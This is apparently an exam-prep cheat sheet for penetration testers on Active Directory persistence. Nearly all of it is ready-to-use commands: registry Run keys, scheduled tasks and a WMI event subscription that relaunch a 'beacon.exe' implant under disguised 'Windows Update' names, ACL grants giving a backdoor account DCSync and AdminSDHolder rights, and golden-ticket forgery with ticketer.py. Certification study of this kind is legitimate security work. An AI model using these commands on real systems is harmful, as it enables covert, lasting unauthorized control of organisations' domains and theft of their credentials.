# Phase 11: Active Directory Persistence

> Lock in your access before moving to flag collection. Exam may have disruptions.

---

## Host-Based Persistence

### Registry Run Keys
```powershell
# Survives user logon (not reboots without user login)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "C:\Windows\Temp\beacon.exe" /f
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "C:\Windows\Temp\beacon.exe" /f  # needs admin
```

### Scheduled Task
```powershell
# Survives reboots
schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\beacon.exe" /sc ONLOGON /ru SYSTEM /f
schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\beacon.exe" /sc MINUTE /mo 5 /ru SYSTEM /f
```

### WMI Event Subscription
```powershell
# Persistent — survives reboots, no file needed after setup
$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name='SystemUpdate'; EventNamespace='root\cimv2';
    QueryLanguage='WQL'; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name='SystemUpdate'; CommandLineTemplate="C:\Windows\Temp\beacon.exe"
}
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$Filter; Consumer=$Consumer}
```

---

## Domain-Level Persistence

### DCSync ACL Grant (Stealthy)
```powershell
# Give yourself permanent DCSync rights (survives password resets)
Add-DomainObjectACL -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity backdoor_user -Rights DCSync
```

### AdminSDHolder Grant (Persistent Over Cleanup)
```powershell
# Re-applied every 60 min by SDProp to all protected groups
Add-DomainObjectACL -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=domain,DC=local' \
  -PrincipalIdentity backdoor_user -Rights All
```

### Golden Ticket (Survives Password Changes)
```bash
# Store krbtgt hash + domain SID — forge tickets anytime
ticketer.py -nthash <krbtgt_hash> -domain-sid S-1-5-21-... -domain domain.local administrator
# Valid for 10 years by default — survives 1x krbtgt reset
```

---

## Exam Tip

For the exam, **lightweight persistence** is usually enough:
1. Scheduled task as SYSTEM (survives reboot)
2. Store all harvested hashes in `~/exam/loot/` on Kali
3. If you lose your beacon — you can re-beacon using stored creds

Don't over-engineer persistence in a 5-hour exam. Get flags first, add persistence as a backup.

---

## Next Step → **Phase 12: LOLBAS** (`12-lolbas.md`)
